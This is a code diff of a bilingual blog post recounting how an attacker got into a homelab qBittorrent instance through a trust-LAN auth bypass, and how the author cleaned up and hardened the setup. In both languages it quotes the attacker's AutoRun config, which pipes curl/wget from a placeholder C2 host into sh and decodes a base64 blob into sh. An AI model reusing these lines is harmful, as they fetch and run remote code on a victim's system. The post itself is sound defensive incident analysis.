@@ -9,7 +9,7 @@ export const metadata: PostMetadata = {
 }
 
 const englishContent: PostContent = {
-  title: 'The LAN Is Dead. You Built the Reverse Proxy That Killed It.',
+  title: 'How a Trusted-LAN Checkbox Gave a Stranger Root in My Homelab',
   description: 'I run 40+ services behind Traefik. One of them — qBittorrent — trusted my LAN by default. So did my reverse proxy. The internet bypassed my auth, dropped a remote shell, and ran for days before I noticed. Here is what I found, what I changed, and why every homelab with a reverse proxy is one default checkbox away from the same fate.',
   html: `<p><strong>TL;DR:</strong> I run 40+ services behind Traefik on my homelab. One of them — qBittorrent — trusted "the LAN" by default. My reverse proxy <em>lives</em> on the LAN. So every external request, routed through the proxy, looked like a trusted local client. An attacker walked through the front door and injected an <code>OnTorrentAdded</code> autorun pulling a remote shell. I noticed because the UI looked weird. Not because of an alert. Because of a vibe. Then I audited the other 39 services — <strong>3 admin UIs were wide open to the internet.</strong> If you run a homelab with a reverse proxy and any "trust the LAN" toggle is enabled somewhere, you are likely running my homelab from a week ago.</p>
 <hr>
@@ -25,7 +25,7 @@ OnTorrentAdded\\Enabled=true
 OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
 enabled=true
 program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
-<p>Every torrent added → arbitrary remote code, executed inside the qBit container, with the qBit user's privileges and access to every bind mount and the VPN namespace. The C2 was alive. Last-modified on the dropper: two days before I found it. Caddy was happily serving the payload.</p>
+<p>Every torrent added → arbitrary remote code, executed inside the qBit container, with the qBit user's privileges and access to every bind mount and the VPN namespace. The <em>C2</em> — the attacker's command-and-control server, the address a compromised host calls home to for instructions — was alive. The <em>dropper</em> — the small first-stage script whose only job is to fetch and execute the real payload — had a last-modified two days before I found it. Caddy was happily serving it.</p>
 <p>I stopped the container.</p>
 
 <h2>The flaw is not qBittorrent. The flaw is the model.</h2>
@@ -71,22 +71,22 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <p>Cleanup happened in three passes: stop the bleeding, then audit, then harden.</p>
 
 <h3>Stop the bleeding</h3>
-<p>The C2 callback is a known-bad fileless dropper. Three layers of blocking, because each layer catches what the previous one misses:</p>
+<p>The C2 callback is a known-bad fileless dropper. I blocked it at three layers, because each layer catches what the previous one misses:</p>
 <ol>
-<li><strong>DNS sinkhole</strong> at Pi-hole, exact-match deny on the C2 hostname. Catches anything resolving by name. Doesn't help with IP-literal callbacks.</li>
-<li><strong>Host iptables <code>OUTPUT</code> + <code>FORWARD</code> drops</strong> on the C2 IP. Catches the IP-literal path and any container egress that exits via the host's default route. Persisted across reboots via <code>netfilter-persistent</code>.</li>
-<li><strong>Edge firewall (<code>WAN_OUT</code> drop)</strong> on the gateway, scoped to the C2 IP via an address group. Catches anything that bypasses the host (other VLANs, IoT, the printer, your kid's laptop).</li>
+<li><strong>At the DNS layer (Pi-hole).</strong> Block the C2 domain so anything resolving it by name goes nowhere. Cheap, instant — useless if the malware skips DNS and connects to a raw IP.</li>
+<li><strong>At the host firewall (iptables).</strong> Drop outbound packets to the C2's IP, both from the host and from any container it routes. Catches the raw-IP case the DNS layer misses. Made permanent so it survives a reboot.</li>
+<li><strong>At the edge router.</strong> The same drop rule on the gateway, pointed at the same C2 IP. Catches anything on the network that doesn't route through the homelab host — IoT devices, phones, the printer, your kid's laptop.</li>
 </ol>
-<p>A single layer would be a checkbox. Three layers is defense-in-depth that accepts that any one of them might be wrong.</p>
+<p>A single layer would be a checkbox. Three layers is defense-in-depth that accepts any one of them might be wrong.</p>
 
 <h3>Sanitize and audit</h3>
-<p>For the compromised app: removed the entire <code>[AutoRun]</code> block, disabled <code>AuthSubnetWhitelistEnabled</code>, rotated the WebUI password (with proper PBKDF2-HMAC-SHA512 hashing, not a UI form click — generate the salt + hash yourself if you want to know what's in your config), preserved a forensic copy of the config and the dropper for later reference, and pulled the running container's process list looking for the fileless tell:</p>
+<p>For the compromised app: I deleted the <code>[AutoRun]</code> block, turned off the trust-LAN bypass, rotated the WebUI password (generating the salted hash myself rather than clicking the UI form — at least then I know what's in my config), kept a forensic copy of the config and the dropper, and scanned the container's running processes for a tell-tale sign of the malware:</p>
 <pre><code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code></pre>
-<p>That's the canonical IoC for the drop-exec-rm pattern: a process whose binary inode no longer exists on disk. None showed up. Stage 2 had run, sent home what it sent home, and exited cleanly when the container went down.</p>
-<p>For everything else: I read every Traefik router's labels, listed which had a <code>middlewares=</code> line, and grouped the rest by their internal auth state. Three were open. The rest were either fine on their own merits or arguably fine for their threat model. <em>Arguably</em> is doing work in that sentence — see the next section.</p>
+<p>That command lists running processes whose executable on disk has already been deleted — the classic fingerprint of "drop, run, delete" malware that tries to leave nothing behind. Nothing showed up. The dropper had done its job and exited cleanly when I stopped the container.</p>
+<p>For everything else: I walked every service exposed through Traefik, noted which ones had an auth gate in front and which were relying on their own internal login. Three had no auth at all. The rest were either fine on their own merits or <em>arguably</em> fine for their threat model — and <em>arguably</em> is doing work in that sentence. See the next section.</p>
 
 <h3>Default-deny the perimeter</h3>
-<p>The honest fix isn't "secure the three I missed." It is "stop trusting that I will catch the next one." So I added a uniform forwardAuth middleware (<a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> — small, single-purpose, fits the blast radius I needed; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> or <a target="_blank" rel="noopener noreferrer" href="https://www.authentik.io/">Authentik</a> would do as well) in front of every service whose intended audience is <em>me</em> and not third-party clients. That covered <strong>17 admin UIs</strong>. Anything reachable at <code>&lt;svc&gt;.&lt;domain&gt;</code> now gets a forwardAuth challenge before it touches the upstream. Even if the upstream has its own auth — and it usually does — the forwardAuth gate means an unauthenticated bug in the upstream doesn't ship to the internet.</p>
+<p>The honest fix isn't "secure the three I missed." It is "stop trusting that I will catch the next one." So I put a small auth service in front of every service whose only intended user is <em>me</em>: <a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> (minimal, single-purpose, fits the blast radius I needed; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> or <a target="_blank" rel="noopener noreferrer" href="https://www.authentik.io/">Authentik</a> would do as well). Now Traefik asks the auth service "is this person logged in?" before forwarding any request to the actual app. That covered <strong>17 admin UIs</strong>. Even if the app behind has an unauthenticated bug — and someday one will — the request never reaches it without a valid session first.</p>
 <p>Services that <em>do</em> need to talk to third parties (mobile apps, SDKs, CLIs, webhooks from external systems, password manager clients, photo-sync clients) stayed on their own auth, with the explicit understanding that I owe each of them a much closer look. That list is shorter than the gated list, and every entry on it is a known weak point I'm now actively monitoring.</p>
 <p>The rule going forward is one line in any new service's compose file:</p>
 <pre><code>- "traefik.http.routers.&lt;name&gt;.middlewares=tinyauth@docker"</code></pre>
@@ -154,7 +154,7 @@ OnTorrentAdded\\Enabled=true
 OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
 enabled=true
 program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
-<p>Chaque torrent ajouté → exécution de code distant arbitraire, à l'intérieur du conteneur qBit, avec les privilèges de l'utilisateur qBit et l'accès à chaque bind mount et au namespace VPN. Le C2 était vivant. Last-modified sur le dropper : deux jours avant que je le trouve. Caddy servait le payload tranquillement.</p>
+<p>Chaque torrent ajouté → exécution de code distant arbitraire, à l'intérieur du conteneur qBit, avec les privilèges de l'utilisateur qBit et l'accès à chaque bind mount et au namespace VPN. Le <em>C2</em> — le serveur de <em>command-and-control</em> de l'attaquant, l'adresse vers laquelle un hôte compromis appelle pour recevoir ses instructions — était vivant. Le <em>dropper</em> — le petit script de première étape dont le seul rôle est de récupérer et d'exécuter la vraie charge utile — avait un last-modified à deux jours avant que je le trouve. Caddy le servait tranquillement.</p>
 <p>J'ai stoppé le conteneur.</p>
 
 <h2>Le défaut n'est pas dans qBittorrent. Il est dans le modèle.</h2>
@@ -200,22 +200,22 @@ WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
 <p>Le nettoyage s'est fait en trois passes : arrêter l'hémorragie, puis auditer, puis durcir.</p>
 
 <h3>Arrêter l'hémorragie</h3>
-<p>Le callback C2 est un dropper fileless connu. Trois couches de blocage, parce que chaque couche rattrape ce que la précédente rate :</p>
+<p>Le callback C2 est un dropper fileless connu. Je l'ai bloqué sur trois couches, parce que chaque couche rattrape ce que la précédente rate :</p>
 <ol>
-<li><strong>Sinkhole DNS</strong> sur Pi-hole, deny exact-match sur le hostname C2. Rattrape tout ce qui résout par nom. N'aide pas avec les callbacks IP littérale.</li>
-<li><strong>iptables hôte <code>OUTPUT</code> + <code>FORWARD</code> drop</strong> sur l'IP C2. Rattrape le chemin IP littérale et tout sortant de conteneur qui passe par la route par défaut de l'hôte. Persisté à travers les reboots via <code>netfilter-persistent</code>.</li>
-<li><strong>Firewall edge (<code>WAN_OUT</code> drop)</strong> sur la passerelle, scopé à l'IP C2 via un address group. Rattrape tout ce qui contourne l'hôte (autres VLANs, IoT, l'imprimante, le portable de votre gosse).</li>
+<li><strong>Au niveau DNS (Pi-hole).</strong> Bloquer le domaine du C2 : tout ce qui le résout par nom n'arrive nulle part. Pas cher, instantané — inutile si le malware saute le DNS et se connecte directement à une IP brute.</li>
+<li><strong>Au niveau du firewall de l'hôte (iptables).</strong> Drop des paquets sortants vers l'IP du C2, depuis l'hôte lui-même comme depuis les conteneurs qu'il route. Rattrape le cas IP brute que le DNS rate. Rendu permanent pour survivre à un reboot.</li>
+<li><strong>Au niveau du routeur edge.</strong> La même règle de drop sur la passerelle, pointée sur la même IP. Rattrape tout ce qui sur le réseau ne passe pas par l'hôte du homelab — objets connectés, téléphones, imprimante, le portable de votre gosse.</li>
 </ol>
 <p>Une seule couche serait une case à cocher. Trois couches, c'est de la défense en profondeur qui accepte qu'une d'elles peut être fausse.</p>
 
 <h3>Sanitiser et auditer</h3>
-<p>Pour l'appli compromise : suppression du bloc <code>[AutoRun]</code> entier, désactivation de <code>AuthSubnetWhitelistEnabled</code>, rotation du mot de passe WebUI (avec un hash PBKDF2-HMAC-SHA512 propre, pas un clic dans le formulaire UI — générez le sel + hash vous-même si vous voulez savoir ce qui est dans votre config), conservation d'une copie forensique de la config et du dropper pour référence, et inspection de la liste des process du conteneur en cherchant le tell fileless :</p>
+<p>Pour l'appli compromise : j'ai supprimé le bloc <code>[AutoRun]</code>, désactivé le bypass trust-LAN, fait la rotation du mot de passe WebUI (en générant le hash salé moi-même plutôt qu'en cliquant dans le formulaire UI — au moins je sais ce qui est dans ma config), gardé une copie forensique de la config et du dropper, et scanné les process du conteneur à la recherche d'un signe révélateur du malware :</p>
 <pre><code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code></pre>
-<p>C'est l'IoC canonique du pattern drop-exec-rm : un process dont l'inode du binaire n'existe plus sur disque. Aucun n'est apparu. Le stage 2 avait tourné, envoyé ce qu'il avait à envoyer, et était sorti proprement quand le conteneur s'est arrêté.</p>
-<p>Pour le reste : j'ai lu les labels de chaque routeur Traefik, listé lesquels avaient une ligne <code>middlewares=</code>, et groupé le reste par leur état d'auth interne. Trois étaient ouverts. Le reste était soit propre par ses propres mérites soit défendable pour leur threat model. <em>Défendable</em> fait du travail dans cette phrase — voir la section suivante.</p>
+<p>Cette commande liste les process en cours dont l'exécutable sur disque a déjà été supprimé — la signature classique du malware "dépose, exécute, efface" qui essaie de ne rien laisser derrière. Rien n'est apparu. Le dropper avait fait son boulot et était sorti proprement quand le conteneur s'est arrêté.</p>
+<p>Pour le reste : j'ai parcouru chaque service exposé via Traefik, en notant lesquels avaient une barrière d'auth devant et lesquels comptaient sur leur propre login interne. Trois n'avaient aucune auth. Le reste était soit propre par ses propres mérites soit <em>défendable</em> pour son threat model — et <em>défendable</em> fait du travail dans cette phrase. Voir la section suivante.</p>
 
 <h3>Default-deny au périmètre</h3>
-<p>La correction honnête n'est pas "sécuriser les trois que j'ai ratés." C'est "arrêter de faire confiance au fait que je rattraperai le suivant." Donc j'ai ajouté un middleware forwardAuth uniforme (<a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> — petit, monoTâche, taille de blast radius dont j'avais besoin ; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> ou <a target="_blank" rel="noopener noreferrer" href="https://www.authentik.io/">Authentik</a> feraient aussi l'affaire) devant chaque service dont le public visé c'est <em>moi</em> et pas des clients tiers. Ça a couvert <strong>17 interfaces d'admin</strong>. Tout ce qui est joignable à <code>&lt;svc&gt;.&lt;domain&gt;</code> reçoit maintenant un challenge forwardAuth avant de toucher l'amont. Même si l'amont a sa propre auth — et c'est généralement le cas — la barrière forwardAuth fait qu'un bug d'auth dans l'amont ne sort pas vers internet.</p>
+<p>La correction honnête n'est pas "sécuriser les trois que j'ai ratés." C'est "arrêter de faire confiance au fait que je rattraperai le suivant." Donc j'ai mis un petit service d'auth devant chaque service dont le seul utilisateur prévu c'est <em>moi</em> : <a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> (minimal, mono-tâche, taille de blast radius dont j'avais besoin ; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> ou <a target="_blank" rel="noopener noreferrer" href="https://www.authentik.io/">Authentik</a> feraient aussi l'affaire). Maintenant Traefik demande au service d'auth "est-ce que cette personne est connectée ?" avant de transmettre la requête à l'appli derrière. Ça couvre <strong>17 interfaces d'admin</strong>. Même si l'appli derrière a un bug d'auth — et ça finira par arriver — la requête ne l'atteint jamais sans une session valide.</p>
 <p>Les services qui <em>ont besoin</em> de parler à des tiers (apps mobiles, SDKs, CLIs, webhooks d'origine externe, clients de gestionnaires de mot de passe, clients de sync photos) sont restés sur leur propre auth, avec la compréhension explicite que je leur dois à chacun un examen bien plus serré. Cette liste est plus courte que la liste des services barrés, et chaque entrée est un point faible connu que je surveille activement maintenant.</p>
 <p>La règle pour la suite, c'est une ligne dans le compose de tout nouveau service :</p>
 <pre><code>- "traefik.http.routers.&lt;name&gt;.middlewares=tinyauth@docker"</code></pre>
